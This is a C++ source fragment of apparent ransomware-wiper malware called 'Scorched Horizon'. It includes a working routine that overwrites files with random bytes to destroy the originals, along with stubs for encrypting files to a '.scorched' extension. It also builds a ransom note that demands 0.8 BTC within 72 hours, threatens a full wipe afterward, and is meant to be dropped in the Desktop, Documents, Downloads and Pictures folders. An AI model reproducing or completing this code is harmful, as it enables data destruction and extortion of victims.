// scorched Horizon – aggressive wipe-hybrid style

// ... includes

void overwrite_junk(const fs::path& p) {
    try {
        uintmax_t sz = fs::file_size(p);
        std::ofstream f(p, std::ios::binary);
        std::vector<byte> junk(sz);
        AutoSeededRandomPool().GenerateBlock(junk.data(), sz);
        f.write((char*)junk.data(), sz);
    } catch (...) {}
}

void encrypt_aggressive(const fs::path& path, const SecByteBlock& key, const SecByteBlock& hmac_key) {
    overwrite_junk(path);  // destroy original first
    // then encrypt → .scorched
    // similar to encrypt_file but extension ".scorched"
}

int main() {
    auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    auto deadline = now + 72 * 3600;

    char buf[64];
    std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M", std::localtime(&now));
    std::string start_time = buf;
    std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M", std::localtime(&deadline));
    std::string dead_str = buf;

    std::string mid = generate_machine_id();

    std::string note_text = "SCORCHED HORIZON ACTIVATED\n"
                            "Files encrypted @ " + start_time + "\n"
                            "DEADLINE: " + dead_str + "\n"
                            "0.8 BTC → bc1q...\n"
                            "ID: " + mid + "\n"
                            "After deadline → full wipe begins.\n";

    // Target Desktop/Documents/Downloads/Pictures
    // encrypt_aggressive(...)
    // write note_text to READ_OR_LOSE_EVERYTHING.txt in each folder

    std::cout << "Scorched complete. ID: " << mid << "\n";
}